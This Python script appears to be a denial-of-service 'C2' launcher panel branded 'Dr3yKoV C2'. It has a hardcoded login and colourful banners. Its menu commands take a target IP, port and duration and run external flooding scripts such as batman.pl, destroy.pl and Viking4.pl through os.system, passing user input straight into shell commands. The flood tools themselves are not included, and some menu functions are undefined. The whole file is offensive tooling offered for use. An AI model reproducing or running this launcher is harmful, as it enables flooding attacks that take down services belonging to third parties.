import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    time.sleep(1)
    clear()
    print(f"""
\033[91m                                   ╦  ╔═╗╔═╗╦╔╗╔
\033[91m                                   ║  ║ ║║ ╦║║║║
\033[91m                                   ╩═╝╚═╝╚═╝╩╝╚╝
\033[91m                               "𝕿𝖍𝖊 𝖜𝖆𝖗 𝖜𝖆𝖘 𝖓𝖊𝖛𝖊𝖗 𝖔𝖛𝖊𝖗" 
\033[91m               ╚╦══════════════════════════════════════════════╦╝
\033[91m                ║ ....HELLO....║ WELCOME TO Dr3yKoV C2 BY NTV  ║
\033[91m                ╚══════════════════════════════════════════════╝
    
\033[91m                                      LOADING ...
    """)
    time.sleep(5)
    clear()

def help():
    clear()
    si()
    print(f'''METHODS ATTACK LAYER 4 BY NGUYEN THANH VINH
\033[95movh-kill    \033[97m►  \033[92mGOOD
\033[95mstress-mix  \033[97m►  \033[92mGOOD
\033[95mackv2       \033[97m►  \033[92mGOOD
\033[95mhex-std     \033[97m►  \033[92mGOOD
\033[95mnuke-mix    \033[97m►  \033[91mOFFLINE
''') 
def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mDr3yKoV C2 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Dr3yKoV C2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Ng Thanh Vinh \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mPower C2')
    print("")
def menu():
    sys.stdout.write(f"         \x1b]2;Dr3yKoV C2 Stars: [{bots}] | Online Users: [26] | Methods: [12] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mDr3yKoV C2 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Dr3yKoV C2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Ng Thanh Vinh \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mPower C2')
    print("")
    print("""
\033[36m          MMMMMMMMMMMMMMMMMMMMM               \033[90mm               MMMMMMMMMMMMMMMMMMMMM
\033[36m           `MMMMMMMMMMMMMMMMMMMM           N  \033[90mm  N           MMMMMMMMMMMMMMMMMMMM'
\033[36m             `MMMMMMMMMMMMMMMMMMM          MMM\033[90mmMMM          MMMMMMMMMMMMMMMMMMM'  
\033[36m               MMMMMMMMMMMMMMMMMMM-_______MMMM\033[90mmMMMM_______-MMMMMMMMMMMMMMMMMMM    
\033[36m                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\033[90mmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
\033[36m                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\033[90mmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
\033[36m                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\033[90mmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
\033[36m               .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\033[90mmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
\033[36m              MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\033[90mmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
\033[36m                             `MMMMMMMMMMMMMMMM\033[90mmMMMMMMMMMMMMMMMM'                
\033[36m                                    `MMMMMMMMM\033[90mmMMMMMMMMM'                    
\033[36m                                        `MMMMM\033[90mmMMMMM'                              
\033[36m                                           MMM\033[90mmMMM                         
\033[36m                                            MM\033[90mmMM                                  
\033[36m                                             M\033[90mmM                                  

""")

def main():
    menu()
    while(True):
        cnc = input(f"""\033[30;47m\033[30m\033[30mDr3yKoV \033[0m\033[30;47m\033[30m● \033[0m\033[30;47m\033[30mC2\033[0m\033[30;47m\033[30m ➤➤ \033[0m""")
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "help" or cnc == "HELP" or cnc == "Help" or cnc == "Cuu":
            help()


# LAYER 4 METHODS   
        elif "ovh-kill" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl batman.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Usage: ovh-kill <ip> <port> <time>')
                print('Example: ovh-kill 1.1.1.1 80 60')

        elif "ackv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Usage: ackv2 <ip> <port> <time>')
                print('Example: ackv2 1.1.1.1 80 60')

        elif "hex-std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl demon.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Usage: hex-std <ip> <port> <time>')
                print('Example: hex-std 1.1.1.1 80 60')

        elif "stress-mix" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl Viking4.pl {ip} {port} 5 {time}')
            except IndexError:
                print('Usage: stress-mix <ip> <port> 5 <time>')
                print('Example: stress-mix 1.1.1.1 80 60')

        elif "nuke-mix" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'./ovh -d {ip} -p {port} -t {time} -z 130')
            except IndexError:
                print('Usage: nuke-mix <ip> <port> <time>')
                print('Example: nuke-mix 1.1.1.1 80 60')

        
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] ERROR COMMAND !")
            except IndexError:
                pass


def login():
    clear()
    user = "1"
    passwd = "1"
    username = input("USER LOGIN: ")
    password = getpass.getpass(prompt='PASS LOGIN: ')
    if username != user or password != passwd:
        print("")
        print("ERROR")
        sys.exit(1)
    elif username == user and password == passwd:
        print("SUCCESS")
        time.sleep(0.1)
        ascii_vro()
        main()

login()